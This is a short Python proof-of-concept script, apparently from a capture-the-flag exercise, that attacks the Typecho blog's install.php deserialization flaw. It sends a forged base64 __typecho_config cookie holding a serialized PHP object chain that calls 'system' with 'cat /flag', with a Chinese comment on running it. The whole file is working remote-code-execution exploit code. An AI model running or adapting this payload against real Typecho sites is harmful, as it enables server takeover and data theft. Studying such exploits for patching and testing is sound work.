import requests

url='http://127.0.0.1:5000/install.php?finish=1'
files={'file':123}
headers={
    #运行poc替换__typecho_config
    'cookie':'PHPSESSID=test;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo5OiJjYXQgL2ZsYWciO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fX19fXM6NjoicHJlZml4IjtzOjQ6InRlc3QiO30=',
    'Referer':'http://127.0.0.1:5000/intall.php'
}
re=requests.post(url,files=files,headers=headers,data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"})
print(re.text)
